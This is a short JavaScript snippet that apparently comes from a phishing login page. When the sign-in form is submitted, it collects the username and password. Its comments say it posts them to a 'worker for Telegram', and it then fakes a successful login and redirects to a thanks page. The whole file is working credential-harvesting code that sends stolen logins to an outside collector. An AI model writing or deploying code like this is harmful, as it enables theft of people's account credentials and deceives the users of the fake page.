$('#signin').click(function(event) {
    event.preventDefault();
    username = document.getElementById("userID").value;
    passerror = document.getElementById("passwordErrorText");
    password = document.getElementById("password").value;

    if (password.length < 4) {
        passerror.style.fontSize = "small";
        passerror.innerHTML = "Please enter your password correctly!";
    } else {
        // Simulate successful login
        // Send the username and password to the worker for Telegram
        fetch(url, {
            method: "POST",
            body: JSON.stringify({
                userID: username, // Ensure we're sending the correct field
                password: password,
            }),
            headers: {
                "Content-type": "application/json; charset=UTF-8"
            }
        })
        .then(function(response) {
            // Simulate successful login (after second submission)
            setCookie("username", username, 30);
            // Redirect to thanks.html (success)
            window.location.href = "./thanks.html";
        });
    }
});
